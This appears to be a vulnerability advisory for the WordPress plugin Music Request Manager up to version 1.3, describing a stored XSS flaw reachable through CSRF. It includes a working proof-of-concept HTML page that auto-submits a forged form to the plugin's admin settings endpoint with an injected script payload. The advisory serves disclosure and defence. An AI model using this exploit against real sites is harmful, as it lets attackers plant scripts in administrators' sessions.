## WordPress Plugin Vulnerabilities

# Music Request Manager <= 1.3 - Stored XSS via CSRF

### Description

The plugin does not have CSRF check in some places, and is missing sanitisation as well as escaping, which could allow attackers to make logged in admin add Stored XSS payloads via a CSRF attack

### Proof of Concept

Make a logged in admin open an HTML file containing:
```
<html>
<body>
<form action="https://example.com/wp-admin/options-general.php?page=set-music-options" method="POST">
<input type="hidden" name="counter" value='"><script>alert(999)</script>' />
<input type="hidden" name="credit" value="yes" />
<input type="submit" value="Submit request" />
</form>
<script>
history.pushState('', '', '/');
document.forms[0].submit();
</script>
</body>
</html>
```
